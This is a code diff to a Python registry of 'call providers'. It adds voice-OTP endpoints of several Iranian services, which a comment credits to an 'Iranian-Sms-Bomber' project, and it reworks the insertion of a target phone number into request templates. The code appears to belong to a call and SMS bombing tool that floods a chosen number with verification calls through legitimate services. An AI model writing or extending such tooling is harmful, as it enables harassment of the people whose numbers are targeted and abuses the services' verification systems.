@@ -22,12 +22,16 @@ class CallProvider:
     def get_request_data(self, phone_number: str) -> Dict[str, Any]:
         """Generate request data for the call provider."""
         if isinstance(self.data_template, str):
-            return {"phone": self.data_template.format(phone=phone_number)}
+            return {"phone": self.data_template.replace("{phone}", phone_number)}
 
         data = self.data_template.copy()
         for key, value in data.items():
-            if isinstance(value, str) and "{phone}" in value:
-                data[key] = value.format(phone=phone_number)
+            if isinstance(value, str):
+                # Handle {phone[1:]} - phone without first digit (removes leading 0)
+                if "{phone[1:]}" in value:
+                    data[key] = value.replace("{phone[1:]}", phone_number[1:] if len(phone_number) > 1 else phone_number)
+                elif "{phone}" in value:
+                    data[key] = value.replace("{phone}", phone_number)
             elif value == "{phone}":
                 data[key] = phone_number
         return data
@@ -72,6 +76,32 @@ class CallProviderRegistry:
                 name="Snapp Call",
                 url="https://app.snapp.taxi/api/api-passenger-oauth/v2/call-otp",
                 data_template={"cellphone": "{phone}"},
+                call_type="voice"
+            ),
+            # New call providers from Iranian-Sms-Bomber
+            CallProvider(
+                name="Paklean Call",
+                url="https://client.api.paklean.com/user/resendVoiceCode",
+                data_template={"username": "{phone}"},
+                call_type="voice"
+            ),
+            CallProvider(
+                name="Novinbook Call",
+                url="https://novinbook.com/index.php?route=account/phone",
+                data_template={"phone": "{phone}", "call": "yes"},
+                call_type="voice"
+            ),
+            CallProvider(
+                name="Azki Call",
+                url="https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber={phone}",
+                data_template={},
+                method="GET",
+                call_type="voice"
+            ),
+            CallProvider(
+                name="Ragham Call",
+                url="https://web.raghamapp.com/api/users/code",
+                data_template={"phone": "{phone}"},
                 call_type="voice"
             ),
         ]
